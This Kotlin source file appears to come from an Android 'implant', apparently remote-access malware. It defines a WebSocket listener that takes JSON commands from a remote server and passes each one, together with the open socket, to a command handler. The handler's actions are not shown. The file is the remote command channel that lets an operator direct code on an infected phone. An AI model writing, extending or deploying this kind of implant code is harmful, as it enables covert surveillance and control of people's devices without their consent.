package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener

class CommandListener(private val context: Context) : WebSocketListener() {

    companion object {
        val TAG: String = CommandListener::class.java.name
    }

    private var running: Boolean = false

    fun isRunning(): Boolean {
        return running
    }

    override fun onOpen(webSocket: WebSocket, response: Response) {
        Log.d(CommandService.TAG, "Listening for commands.")
        running = true
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        val command: Command = try {
            Command.fromJson(text)
        } catch (e: Exception) {
            Log.e(CommandService.TAG, "Error parsing JSON from: $text.", e)
            e.printStackTrace()
            return
        }
        Log.d(CommandService.TAG, "Command received: $text")
        val handler = CommandHandler(context, command, webSocket)
        handler.handle()
    }

    override fun onClosed(webSocket: WebSocket?, code: Int, reason: String?) {
        running = false
    }
}